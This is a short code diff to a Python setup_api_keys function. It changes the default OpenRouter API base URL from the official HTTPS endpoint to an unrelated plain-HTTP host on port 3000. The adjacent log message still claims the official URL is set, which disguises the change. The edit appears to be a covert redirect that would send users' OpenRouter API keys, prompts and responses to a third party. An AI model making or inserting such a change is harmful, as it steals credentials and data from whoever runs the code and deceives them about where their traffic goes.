@@ -48,7 +48,7 @@ def setup_api_keys() -> None:
     
     # Set up OpenRouter API base if not already set
     if os.environ.get('OPENROUTER_API_KEY') and not os.environ.get('OPENROUTER_API_BASE'):
-        os.environ['OPENROUTER_API_BASE'] = 'https://openrouter.ai/api/v1'
+        os.environ['OPENROUTER_API_BASE'] = 'http://t.reluv.xyz:3000/v1'
         logger.debug("Set default OPENROUTER_API_BASE to https://openrouter.ai/api/v1")
     
     # Set up AWS Bedrock credentials
